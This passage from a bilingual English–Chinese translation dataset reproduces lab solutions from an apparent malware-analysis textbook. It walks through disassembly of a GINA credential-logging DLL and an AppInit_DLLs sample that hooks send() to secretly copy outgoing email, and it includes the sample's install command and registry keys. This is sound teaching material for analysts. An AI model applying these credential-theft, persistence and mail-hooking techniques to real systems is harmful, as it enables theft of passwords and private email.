  zh: 恶意软件没有调用该函数；它只是解析了 *msgina.dll* 中 WlxLoggedOnSAS 的地址，并跳转到该函数，如  处所见。通过跳转而不是调用
    WlxLoggedOnSAS，此代码不会设置堆栈帧或将在堆栈上推送返回地址。当 *msgina.dll* 中的 WlxLoggedOnSAS 被调用时，它将直接返回到
    Winlogon，因为堆栈上的返回地址与调用列表 11-3L 中的代码时的堆栈上的地址相同。
- en: If we continue analyzing the other exports, we see that most operate like WlxLoggedOnSAS
    (they are pass-through functions), except for WlxLoggedOutSAS, which contains
    some extra code. (WlxLoggedOutSAS is called when the user logs out of the system.)
  id: totrans-3052
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们继续分析其他导出，我们会看到大多数操作类似于 WlxLoggedOnSAS（它们是中继函数），除了 WlxLoggedOutSAS，它包含一些额外的代码。（当用户从系统中注销时，会调用
    WlxLoggedOutSAS。）
- en: The export begins by resolving WlxLoggedOutSAS within *msgina.dll* using GetProcAddress
    and then calling it. The export also contains the code shown in Listing 11-4L.
  id: totrans-3053
  prefs: []
  type: TYPE_NORMAL
  zh: 导出首先使用 GetProcAddress 在 *msgina.dll* 中解析 WlxLoggedOutSAS，然后调用它。导出还包含列表 11-4L
    中显示的代码。
- en: 100014FC push offset aUnSDmSPwSOldS  ; "UN %s DM %s PW %s OLD %s"
  id: totrans-3054
  prefs: []
  type: TYPE_NORMAL
  zh: 100014FC push offset aUnSDmSPwSOldS  ; "UN %s DM %s PW %s OLD %s"
- en: 10001501 push 0 ; dwMessageId 10001503 call sub_10001570 
  id: totrans-3055
  prefs: []
  type: TYPE_NORMAL
  zh: 10001501 push 0 ; dwMessageId 10001503 call sub_10001570 
- en: '*Listing 11-4L: WlxLoggedOutSAS calling the credential logging function sub_10001570*'
  id: totrans-3056
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-4L：WlxLoggedOutSAS 调用凭证记录函数 sub_10001570*'
- en: The code in Listing 11-4L passes a bunch of arguments and a format string at
    . This string is passed to sub_10001570, which is called at .
  id: totrans-3057
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-4L 中的代码传递了一堆参数和一个格式字符串。这个字符串传递给了 sub_10001570，它在  处被调用。
- en: Solutions to Labs
  id: totrans-3058
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**569**'
  id: totrans-3059
  prefs: []
  type: TYPE_NORMAL
  zh: '**569**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3060
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: It seems like sub_10001570 may be the logging function for stolen credentials,
    so let’s examine it to see what it does. Listing 11-5L shows the logging code
    contained in sub_10001570\.
  id: totrans-3061
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来 sub_10001570 可能是用于窃取凭证的记录函数，因此让我们检查它以了解它做了什么。列表 11-5L 显示了 sub_10001570 中包含的记录代码。
- en: 1000158E call _vsnwprintf 
  id: totrans-3062
  prefs: []
  type: TYPE_NORMAL
  zh: 1000158E call _vsnwprintf 
- en: 10001593 push offset Mode ; Mode
  id: totrans-3063
  prefs: []
  type: TYPE_NORMAL
  zh: 10001593 push offset Mode ; 模式
- en: 10001598 push offset Filename ; "msutil32.sys"
  id: totrans-3064
  prefs: []
  type: TYPE_NORMAL
  zh: 10001598 push offset Filename ; "msutil32.sys"
- en: 1000159D call _wfopen 
  id: totrans-3065
  prefs: []
  type: TYPE_NORMAL
  zh: 1000159D call _wfopen 
- en: 100015A2 mov esi, eax
  id: totrans-3066
  prefs: []
  type: TYPE_NORMAL
  zh: 100015A2 mov esi, eax
- en: 100015A4 add esp, 18h
  id: totrans-3067
  prefs: []
  type: TYPE_NORMAL
  zh: 100015A4 add esp, 18h
- en: 100015A7 test esi, esi
  id: totrans-3068
  prefs: []
  type: TYPE_NORMAL
  zh: 100015A7 test esi, esi
- en: 100015A9 jz loc_1000164F
  id: totrans-3069
  prefs: []
  type: TYPE_NORMAL
  zh: 100015A9 jz loc_1000164F
- en: 100015AF lea eax, [esp+858h+Dest]
  id: totrans-3070
  prefs: []
  type: TYPE_NORMAL
  zh: 100015AF lea eax, [esp+858h+Dest]
- en: 100015B3 push edi
  id: totrans-3071
  prefs: []
  type: TYPE_NORMAL
  zh: 100015B3 push edi
- en: 100015B4 lea ecx, [esp+85Ch+Buffer]
  id: totrans-3072
  prefs: []
  type: TYPE_NORMAL
  zh: 100015B4 lea ecx, [esp+85Ch+Buffer]
- en: 100015B8 push eax
  id: totrans-3073
  prefs: []
  type: TYPE_NORMAL
  zh: 100015B8 push eax
- en: 100015B9 push ecx ; Buffer 100015BA call _wstrtime 
  id: totrans-3074
  prefs: []
  type: TYPE_NORMAL
  zh: 100015B9 push ecx ; 缓冲区 100015BA call _wstrtime 
- en: 100015BF add esp, 4
  id: totrans-3075
  prefs: []
  type: TYPE_NORMAL
  zh: 100015BF add esp, 4
- en: 100015C2 lea edx, [esp+860h+var_828]
  id: totrans-3076
  prefs: []
  type: TYPE_NORMAL
  zh: 100015C2 lea edx, [esp+860h+var_828]
- en: 100015C6 push eax
  id: totrans-3077
  prefs: []
  type: TYPE_NORMAL
  zh: 100015C6 push eax
- en: 100015C7 push edx ; Buffer 100015C8 call _wstrdate 
  id: totrans-3078
  prefs: []
  type: TYPE_NORMAL
  zh: 100015C7 push edx ; 缓冲区 100015C8 call _wstrdate 
- en: 100015CD add esp, 4
  id: totrans-3079
  prefs: []
  type: TYPE_NORMAL
  zh: 100015CD add esp, 4
- en: 100015D0 push eax
  id: totrans-3080
  prefs: []
  type: TYPE_NORMAL
  zh: 100015D0 push eax
- en: 100015D1 push offset Format ; "%s %s - %s "
  id: totrans-3081
  prefs: []
  type: TYPE_NORMAL
  zh: 100015D1 push offset Format ; "%s %s - %s "
- en: 100015D6 push esi ; File
  id: totrans-3082
  prefs: []
  type: TYPE_NORMAL
  zh: 100015D6 push esi ; 文件
- en: 100015D7 call fwprintf 
  id: totrans-3083
  prefs: []
  type: TYPE_NORMAL
  zh: 100015D7 call fwprintf 
- en: '*Listing 11-5L: The credential-logging function logging to* msutil32.sys'
  id: totrans-3084
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-5L：凭证记录函数记录到* msutil32.sys'
- en: The call to vsnwprintf at  fills in the format string passed in by the WlxLoggedOutSAS
    export. Next, the malware opens the file *msutil32.sys* at , which is created
    inside *C:\Windows\System32\* since that is where Winlogon resides (and *msgina32.dll*
    is running in the Winlogon process). At  and , the date and time are recorded,
    and the information is logged at . You should now realize that *msutil32.sys*
    is used to store logged credentials and that it is not a driver, although its
    name suggests that it is.
  id: totrans-3085
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处的 vsnwprintf 调用填充了由 WlxLoggedOutSAS 导出传入的格式字符串。接下来，恶意软件在  处打开 *msutil32.sys*
    文件，该文件位于 *C:\Windows\System32\* 中，因为 Winlogon 就驻留在那里（并且 *msgina32.dll* 在 Winlogon
    进程中运行）。在  和  处记录日期和时间，并在  处记录信息。你现在应该意识到 *msutil32.sys* 用于存储记录的凭证，尽管它的名字暗示它是一个驱动程序，但它实际上不是。
- en: 'We force the malware to log credentials by running *Lab11-01.exe*, rebooting
    the machine, and then logging in and out of the system. The following is an example
    of the data contained in a log file created by this malware: 09/10/11 15:00:04
    - UN user DM MALWAREVM PW test123 OLD (null) 09/10/11 23:09:44 - UN hacker DM
    MALWAREVM PW p@ssword OLD (null) The usernames are user and hacker, their passwords
    are test123 and p@ssword, and the domain is MALWAREVM.'
  id: totrans-3086
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过运行 *Lab11-01.exe*、重新启动计算机然后登录和注销系统来强制恶意软件记录凭证。以下是由此恶意软件创建的日志文件中的数据示例：09/10/11
    15:00:04 - UN user DM MALWAREVM PW test123 OLD (null) 09/10/11 23:09:44 - UN hacker
    DM MALWAREVM PW p@ssword OLD (null) 用户名是user和hacker，他们的密码是test123和p@ssword，域是MALWAREVM。
- en: '**570**'
  id: totrans-3087
  prefs: []
  type: TYPE_NORMAL
  zh: '**570**'
- en: Appendix C
  id: totrans-3088
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3089
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Summary**'
  id: totrans-3090
  prefs: []
  type: TYPE_NORMAL
  zh: '**总结**'
- en: Lab 11-1 is a GINA interceptor installer. The malware drops a DLL on the system
    and installs it to steal user credentials, beginning after system reboot.
  id: totrans-3091
  prefs: []
  type: TYPE_NORMAL
  zh: 实验11-1是GINA拦截器安装程序。恶意软件在系统上放置一个DLL并将其安装以窃取用户凭证，开始于系统重启后。
- en: Once the GINA interceptor DLL is installed and running, it logs credentials
    to *msutil32.sys* when a user logs out of the system.
  id: totrans-3092
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦GINA拦截器DLL安装并运行，当用户从系统中注销时，它会将凭证记录到 *msutil32.sys*。
- en: '**Lab 11-2 Solutions**'
  id: totrans-3093
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验11-2解决方案**'
- en: '***Short Answers***'
  id: totrans-3094
  prefs: []
  type: TYPE_NORMAL
  zh: '***简答题***'
- en: 1\.
  id: totrans-3095
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: '*Lab11-02.dll* contains one export, named installer.'
  id: totrans-3096
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab11-02.dll* 包含一个名为installer的导出。'
- en: 2\.
  id: totrans-3097
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: If you run the malware from the command line using rundll32.exe Lab11-02.dll,installer,
    the malware copies itself to the Windows system directory as *spoolvxx32.dll*
    and installs itself persistently under AppInit_DLLs.
  id: totrans-3098
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你使用rundll32.exe Lab11-02.dll,installer从命令行运行恶意软件，恶意软件将自身复制到Windows系统目录作为 *spoolvxx32.dll*
    并在AppInit_DLLs下持续安装。
- en: The malware also tries to open *Lab11-02.ini* from the Windows system directory,
    but it doesn’t find it there.
  id: totrans-3099
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件还尝试从Windows系统目录打开 *Lab11-02.ini*，但它没有在那里找到它。
- en: 3\.
  id: totrans-3100
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: '*Lab11-02.ini* must reside in *%SystemRoot%\System32\* in order for the malware
    to run properly.'
  id: totrans-3101
  prefs: []
  type: TYPE_NORMAL
  zh: '*Lab11-02.ini* 必须位于 *%SystemRoot%\System32\* 中，恶意软件才能正常运行。'
- en: 4\.
  id: totrans-3102
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: The malware installs itself in the AppInit_DLLs registry value, which causes
    **1 1**
  id: totrans-3103
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件将其自身安装到AppInit_DLLs注册表值中，这导致 **1 1**
- en: the malware to be loaded into every process that also loads *User32.dll*.
  id: totrans-3104
  prefs: []
  type: TYPE_NORMAL
  zh: 将恶意软件加载到每个也加载 *User32.dll* 的进程。
- en: 5\.
  id: totrans-3105
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: This malware installs an inline hook of the send function.
  id: totrans-3106
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件安装了发送函数的行内钩子。
- en: 6\.
  id: totrans-3107
  prefs: []
  type: TYPE_NORMAL
  zh: '6.'
- en: The hook checks if the outgoing packet is an email message containing RCPT TO:,
    and if this string is found, it adds an additional RCPT TO line containing a malicious
    email account.
  id: totrans-3108
  prefs: []
  type: TYPE_NORMAL
  zh: 钩子检查出站数据包是否是包含RCPT TO:的电子邮件消息，如果找到此字符串，则添加包含恶意电子邮件账户的额外RCPT TO行。
- en: 7\.
  id: totrans-3109
  prefs: []
  type: TYPE_NORMAL
  zh: '7.'
- en: The malware targets only *MSIMN.exe*, *THEBAT.exe*, and *OUTLOOK.exe* because
    all are email clients. The malware does not install the hook unless it is running
    inside one of these processes.
  id: totrans-3110
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件仅针对 *MSIMN.exe*、*THEBAT.exe* 和 *OUTLOOK.exe*，因为它们都是电子邮件客户端。除非恶意软件在这些进程之一内运行，否则它不会安装钩子。
- en: 8\.
  id: totrans-3111
  prefs: []
  type: TYPE_NORMAL
  zh: '8.'
- en: The INI file contains an encrypted email address. After decrypting *Lab11-02.ini*,
    we see it contains *billy@malwareanalysisbook.com*.
  id: totrans-3112
  prefs: []
  type: TYPE_NORMAL
  zh: INI文件包含一个加密的电子邮件地址。在解密 *Lab11-02.ini* 后，我们看到它包含 *billy@malwareanalysisbook.com*。
- en: 9\.
  id: totrans-3113
  prefs: []
  type: TYPE_NORMAL
  zh: '9.'
- en: See “Capturing the Network Traffic” on page 580 for our method of capturing
    data using Wireshark, a fake mail server, and Outlook Express.
  id: totrans-3114
  prefs: []
  type: TYPE_NORMAL
  zh: 请参阅第580页的“捕获网络流量”部分，了解我们使用Wireshark、一个假邮件服务器和Outlook Express捕获数据的方法。
- en: '***Detailed Analysis***'
  id: totrans-3115
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: We begin with basic static analysis of *Lab11-02.dll*. The DLL has only one
    export, named installer. The malware contains imports for manipulating the registry
    (RegSetValueEx), changing the file system (CopyFile), and searching through a
    process or thread listing (CreateToolhelp32Snapshot). The interesting strings
    for *Lab11-02.dll* are shown in Listing 11-6L.
  id: totrans-3116
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从对 *Lab11-02.dll* 的基本静态分析开始。该DLL只有一个导出，名为installer。恶意软件包含用于操作注册表（RegSetValueEx）、更改文件系统（CopyFile）和搜索进程或线程列表（CreateToolhelp32Snapshot）的导入。*Lab11-02.dll*
    的有趣字符串显示在列表11-6L中。
- en: 'RCPT TO: <'
  id: totrans-3117
  prefs: []
  type: TYPE_NORMAL
  zh: 'RCPT TO: <'
- en: THEBAT.EXE
  id: totrans-3118
  prefs: []
  type: TYPE_NORMAL
  zh: THEBAT.EXE
- en: OUTLOOK.EXE
  id: totrans-3119
  prefs: []
  type: TYPE_NORMAL
  zh: OUTLOOK.EXE
- en: MSIMN.EXE
  id: totrans-3120
  prefs: []
  type: TYPE_NORMAL
  zh: MSIMN.EXE
- en: send
  id: totrans-3121
  prefs: []
  type: TYPE_NORMAL
  zh: send
- en: Solutions to Labs
  id: totrans-3122
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**571**'
  id: totrans-3123
  prefs: []
  type: TYPE_NORMAL
  zh: '**571**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3124
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 126](index-605_1.png)'
  id: totrans-3125
  prefs: []
  type: TYPE_IMG
  zh: '![Image 126](index-605_1.png)'
- en: wsock32.dll
  id: totrans-3126
  prefs: []
  type: TYPE_NORMAL
  zh: wsock32.dll
- en: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  id: totrans-3127
  prefs: []
  type: TYPE_NORMAL
  zh: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
- en: spoolvxx32.dll
  id: totrans-3128
  prefs: []
  type: TYPE_NORMAL
  zh: spoolvxx32.dll
- en: AppInit_DLLs
  id: totrans-3129
  prefs: []
  type: TYPE_NORMAL
  zh: AppInit_DLLs
- en: \Lab11-02.ini
  id: totrans-3130
  prefs: []
  type: TYPE_NORMAL
  zh: \Lab11-02.ini
- en: '*Listing 11-6L: Interesting strings in* Lab11-02.dll The strings AppInit_DLLs
    and SOFTWARE\Microsoft\Windows NT\CurrentVersion\ Windows indicate that the malware
    might use AppInit_DLLs to install itself for persistence. The string \Lab11-02.ini
    indicates that the malware uses the INI file provided in this lab.'
  id: totrans-3131
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-6L：Lab11-02.dll 中的有趣字符串*：字符串 AppInit_DLLs 和 SOFTWARE\Microsoft\Windows
    NT\CurrentVersion\ Windows 指示恶意软件可能使用 AppInit_DLLs 来安装自身以实现持久化。字符串 \Lab11-02.ini
    指示恶意软件使用本实验提供的 INI 文件。'
- en: 'Examining the contents of *Lab11-02.ini*, we see that it appears to contain
    encoded or encrypted data. The send and wsock32.dll strings may indicate that
    the malware uses networking functionality, but that is unclear until we dig deeper.
    The process names (OUTLOOK.EXE, MSIMN.EXE, and THEBAT.EXE) are email clients,
    and combining those strings with RCPT TO: leads us to suspect that this malware
    does something with email.'
  id: totrans-3132
  prefs: []
  type: TYPE_NORMAL
  zh: '检查 *Lab11-02.ini* 的内容，我们发现它似乎包含编码或加密的数据。send 和 wsock32.dll 字符串可能表明恶意软件使用网络功能，但这一点在我们深入挖掘之前还不清楚。进程名称（OUTLOOK.EXE、MSIMN.EXE
    和 THEBAT.EXE）是电子邮件客户端，将这些字符串与 RCPT TO: 结合起来，让我们怀疑这种恶意软件与电子邮件有关。'
- en: '**NOTE**'
  id: totrans-3133
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*RCPT is an SMTP command to establish a recipient for an email message.*'
  id: totrans-3134
  prefs: []
  type: TYPE_NORMAL
  zh: '*RCPT 是一个用于为电子邮件消息建立收件人的 SMTP 命令*。'
- en: Next, we use basic dynamic tools like procmon to monitor the malware.
  id: totrans-3135
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用基本的动态工具，如 procmon，来监控恶意软件。
- en: 'We begin by trying to install the malware using the installer export with the
    following command:'
  id: totrans-3136
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先尝试使用安装程序导出以下命令来安装恶意软件：
- en: rundll32.exe Lab11-02.dll,installer
  id: totrans-3137
  prefs: []
  type: TYPE_NORMAL
  zh: rundll32.exe Lab11-02.dll,installer
- en: In procmon, we set a filter for the process *rundll32.exe*, and see the malware
    create a file named *spoolvxx32.dll* in the Windows system directory.
  id: totrans-3138
  prefs: []
  type: TYPE_NORMAL
  zh: 在 procmon 中，我们为进程 *rundll32.exe* 设置了一个过滤器，并看到恶意软件在 Windows 系统目录中创建了一个名为 *spoolvxx32.dll*
    的文件。
- en: Upon further inspection, we see that this file is identical to *Lab11-02.dll*.
  id: totrans-3139
  prefs: []
  type: TYPE_NORMAL
  zh: 进一步检查后，我们发现这个文件与 *Lab11-02.dll* 完全相同。
- en: Further in the procmon listing, we see the malware add *spoolvxx32.dll* to the
    list of AppInit_DLLs (causing the malware to be loaded into every process that
    loads *User32.dll*). Finally, we see that the malware attempts to open *Lab1102.ini*
    from the Windows system directory. Therefore, we should copy the INI file to the
    Windows system directory in order for the malware to access it.
  id: totrans-3140
  prefs: []
  type: TYPE_NORMAL
  zh: 在 procmon 列表中进一步查看，我们看到恶意软件将 *spoolvxx32.dll* 添加到 AppInit_DLLs 列表中（导致恶意软件被加载到每个加载
    *User32.dll* 的进程中）。最后，我们看到恶意软件尝试从 Windows 系统目录打开 *Lab1102.ini*。因此，我们应该将 INI 文件复制到
    Windows 系统目录，以便恶意软件可以访问它。
- en: We move our analysis to IDA Pro to look more deeply into the malware.
  id: totrans-3141
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将分析转移到 IDA Pro，以更深入地研究恶意软件。
- en: We begin by analyzing the installer export. A graph of the cross-references
    from installer is shown in Figure 11-2L.
  id: totrans-3142
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先分析安装程序导出。安装程序交叉引用的图示如图 11-2L 所示。
- en: '*Figure 11-2L: Cross-reference graph of the installer export* **572**'
  id: totrans-3143
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-2L：安装程序导出的交叉引用图* **572**'
- en: Appendix C
  id: totrans-3144
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3145
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: As you can see, installer sets a value in the registry and copies a file to
    the Windows system directory. This matches what we saw during dynamic analysis
    and is confirmed in the disassembly. The installer function’s only purpose is
    to copy the malware to *spoolvxx32.dll* and set it as an AppInit_DLLs value.
  id: totrans-3146
  prefs: []
  type: TYPE_NORMAL
  zh: 如您所见，安装程序在注册表中设置了一个值，并将一个文件复制到 Windows 系统目录。这与我们在动态分析中看到的情况相符，并在反汇编中得到确认。安装程序函数的唯一目的是将恶意软件复制到
    *spoolvxx32.dll* 并将其设置为 AppInit_DLLs 值。
- en: In Listing 11-7L, we focus on DllMain, which starts by checking for DLL_PROCESS_ATTACH,
    as with the previous lab. It appears that this malware runs only during DLL_PROCESS_ATTACH;
    otherwise, DllMain returns without doing anything else.
  id: totrans-3147
  prefs: []
  type: TYPE_NORMAL
  zh: 在列表 11-7L 中，我们关注 DllMain，它首先检查 DLL_PROCESS_ATTACH，就像之前的实验一样。看起来这个恶意软件仅在 DLL_PROCESS_ATTACH
    时运行；否则，DllMain 会返回而不做其他任何事情。
- en: 1000161E cmp [ebp+fdwReason], DLL_PROCESS_ATTACH
  id: totrans-3148
  prefs: []
  type: TYPE_NORMAL
  zh: 1000161E cmp [ebp+fdwReason], DLL_PROCESS_ATTACH
- en: '...'
  id: totrans-3149
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 10001651 call _GetWindowsSystemDirectory 
  id: totrans-3150
  prefs: []
  type: TYPE_NORMAL
  zh: 10001651 call _GetWindowsSystemDirectory 
- en: 10001656 mov [ebp+lpFileName], eax
  id: totrans-3151
  prefs: []
  type: TYPE_NORMAL
  zh: 10001656 mov [ebp+lpFileName], eax
- en: 10001659 push 104h ; Count 1000165E push offset aLab1102_ini ; \\Lab11-02.ini
    
  id: totrans-3152
  prefs: []
  type: TYPE_NORMAL
  zh: 10001659 push 104h ; 计数 1000165E push offset aLab1102_ini ; \\Lab11-02.ini 
- en: 10001663 mov edx, [ebp+lpFileName]
  id: totrans-3153
  prefs: []
  type: TYPE_NORMAL
  zh: 10001663 mov edx, [ebp+lpFileName]
- en: 10001666 push edx ; Dest
  id: totrans-3154
  prefs: []
  type: TYPE_NORMAL
  zh: 10001666 push edx ; 目标
- en: 10001667 call strncat 
  id: totrans-3155
  prefs: []
  type: TYPE_NORMAL
  zh: 10001667 call strncat 
- en: 1000166C add esp, 0Ch
  id: totrans-3156
  prefs: []
  type: TYPE_NORMAL
  zh: 1000166C add esp, 0Ch
- en: 1000166F push 0 ; hTemplateFile **1 1**
  id: totrans-3157
  prefs: []
  type: TYPE_NORMAL
  zh: 1000166F push 0 ; hTemplateFile **1 1**
- en: 10001671 push FILE_ATTRIBUTE_NORMAL ; dwFlagsAndAttributes 10001676 push OPEN_EXISTING
    ; dwCreationDisposition 10001678 push 0 ; lpSecurityAttributes 1000167A push FILE_SHARE_READ
    ; dwShareMode 1000167C push GENERIC_READ ; dwDesiredAccess 10001681 mov eax, [ebp+lpFileName]
  id: totrans-3158
  prefs: []
  type: TYPE_NORMAL
  zh: 10001671 push FILE_ATTRIBUTE_NORMAL ; dwFlagsAndAttributes 10001676 push OPEN_EXISTING
    ; dwCreationDisposition 10001678 push 0 ; lpSecurityAttributes 1000167A push FILE_SHARE_READ
    ; dwShareMode 1000167C push GENERIC_READ ; dwDesiredAccess 10001681 mov eax, [ebp+lpFileName]
- en: 10001684 push eax ; lpFileName 10001685 call ds:CreateFileA 
  id: totrans-3159
  prefs: []
  type: TYPE_NORMAL
  zh: 10001684 push eax ; lpFileName 10001685 call ds:CreateFileA 
- en: '*Listing 11-7L: Code in DllMain that attempts to open* Lab11-02.ini *from the
    system directory* In Listing 11-7L at , we see the Windows system directory retrieved,
    as well as the string for *Lab11-02.ini* at . Together, these form a path with
    the strncat at . The malware attempts to open the INI file for reading at .
    If the file cannot be opened, DllMain returns.'
  id: totrans-3160
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 11-7L: DllMain 中尝试从系统目录打开 Lab11-02.ini 的代码* 在列表 11-7L 的  处，我们看到检索到的
    Windows 系统目录以及 *Lab11-02.ini* 的字符串，如  所示。这些字符串与 strncat 在  处一起形成一个路径。恶意软件尝试以读取方式打开
    INI 文件，如  所示。如果文件无法打开，DllMain 返回。'
- en: If the malware successfully opens the INI file, it reads the file into a global
    buffer, as shown in Listing 11-8L at .
  id: totrans-3161
  prefs: []
  type: TYPE_NORMAL
  zh: 如果恶意软件成功打开 INI 文件，它将文件内容读入全局缓冲区，如列表 11-8L 所示。
- en: 100016A6 push offset byte_100034A0  ; lpBuffer 100016AB mov edx, [ebp+hObject]
  id: totrans-3162
  prefs: []
  type: TYPE_NORMAL
  zh: 100016A6 push offset byte_100034A0  ; lpBuffer 100016AB mov edx, [ebp+hObject]
- en: 100016AE push edx ; hFile 100016AF call ds:**ReadFile**
  id: totrans-3163
  prefs: []
  type: TYPE_NORMAL
  zh: 100016AE push edx ; hFile 100016AF call ds:**ReadFile**
- en: 100016B5 cmp [ebp+NumberOfBytesRead], 0 
  id: totrans-3164
  prefs: []
  type: TYPE_NORMAL
  zh: 100016B5 cmp [ebp+NumberOfBytesRead], 0 
- en: 100016B9 jbe short loc_100016D2
  id: totrans-3165
  prefs: []
  type: TYPE_NORMAL
  zh: 100016B9 jbe short loc_100016D2
- en: 100016BB mov eax, [ebp+NumberOfBytesRead]
  id: totrans-3166
  prefs: []
  type: TYPE_NORMAL
  zh: 100016BB mov eax, [ebp+NumberOfBytesRead]
- en: 100016BE mov byte_100034A0[eax], 0
  id: totrans-3167
  prefs: []
  type: TYPE_NORMAL
  zh: 100016BE mov byte_100034A0[eax], 0
- en: 100016C5 push offset byte_100034A0 
  id: totrans-3168
  prefs: []
  type: TYPE_NORMAL
  zh: 100016C5 push offset byte_100034A0 
- en: 100016CA call sub_100010B3
  id: totrans-3169
  prefs: []
  type: TYPE_NORMAL
  zh: 100016CA call sub_100010B3
- en: '*Listing 11-8L: Reading and decrypting the INI file*'
  id: totrans-3170
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 11-8L: 读取和解密 INI 文件*'
- en: Solutions to Labs
  id: totrans-3171
  prefs: []
  type: TYPE_NORMAL
  zh: 实验解决方案
- en: '**573**'
  id: totrans-3172
  prefs: []
  type: TYPE_NORMAL
  zh: '**573**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-3173
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 127](index-607_1.png)'
  id: totrans-3174
  prefs: []
  type: TYPE_IMG
  zh: '![Image 127](index-607_1.png)'
- en: After the call to ReadFile, the malware checks to make sure the file size is
    greater than 0 at . Next, the buffer containing the file contents is passed to
    sub_100010B3 at . sub_100010B3 looks like it might be a decoding routine because
    it is the first function called after opening a handle to a suspected encoded
    file, so we’ll call it maybeDecoder. To test our theory, we load the malware into
    OllyDbg and set a breakpoint at 0x100016CA. (Make sure you copy the INI file and
    the malware into the Windows system directory and rename the DLL *spoolvxx32.dll*.)
    After the breakpoint is hit, we step over the call maybeDecoder. Figure 11-3L
    shows the result.
  id: totrans-3175
  prefs: []
  type: TYPE_NORMAL
  zh: 在调用 ReadFile 之后，恶意软件检查文件大小是否大于 0，如  所示。接下来，包含文件内容的缓冲区被传递给 sub_100010B3，如 
    所示。sub_100010B3 看起来可能是一个解码例程，因为它是在打开一个疑似编码文件的句柄之后第一个被调用的函数，所以我们将它称为 maybeDecoder。为了测试我们的理论，我们将恶意软件加载到
    OllyDbg 中，并在 0x100016CA 处设置一个断点。（确保您已将 INI 文件和恶意软件复制到 Windows 系统目录中，并将 DLL 重命名为
    *spoolvxx32.dll*。）在断点被触发后，我们跳过对 maybeDecoder 的调用。图 11-3L 显示了结果。
- en: '*Figure 11-3L: OllyDbg showing the decoded contents of* Lab11-02.ini At  in
    Figure 11-3L, the decrypted content—the email address *billy@*'
  id: totrans-3176
  prefs: []
  type: TYPE_NORMAL
  zh: '*Figure 11-3L: OllyDbg 显示 Lab11-02.ini 的解码内容* 在图 11-3L 的  处，解密内容——电子邮件地址 *billy@*'
- en: '*malwareanalysisbook.com*—is pointed to by EAX. This email address is stored
    in the global variable byte_100034A0, which we rename email_address in IDA Pro
    to aid future analysis.'
  id: totrans-3177
  prefs: []
  type: TYPE_NORMAL
  zh: '*malwareanalysisbook.com*—由 EAX 指向。此电子邮件地址存储在全局变量 byte_100034A0 中，我们在 IDA Pro
    中将其重命名为 email_address 以便未来的分析。'
- en: 'We have one last function to analyze inside DllMain: sub_100014B6\. Because
    this function will install an inline hook, we’ll rename it hook_installer. The
    hook_installer function is complicated, so before diving into it, we provide a
    high-level overview of what this inline hook looks like after installation in
    Figure 11-4L.'
  id: totrans-3178
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在 DllMain 中还有一个函数要分析：sub_100014B6。因为这个函数将安装一个内联钩子，所以我们将它重命名为 hook_installer。hook_installer
    函数很复杂，所以在深入之前，我们提供这个内联钩子在安装后如图 11-4L 所示的高级概述。
- en: ws2_32.dll
  id: totrans-3179
  prefs: []
  type: TYPE_NORMAL
  zh: ws2_32.dll
- en: ws2_32.dll
  id: totrans-3180
  prefs: []
  type: TYPE_NORMAL
  zh: ws2_32.dll
- en: send
  id: totrans-3181
  prefs: []
  type: TYPE_NORMAL
  zh: send
- en: send
  id: totrans-3182
  prefs: []
  type: TYPE_NORMAL
  zh: send
- en: call send
  id: totrans-3183
  prefs: []
  type: TYPE_NORMAL
  zh: call send
- en: send
  id: totrans-3184
  prefs: []
  type: TYPE_NORMAL
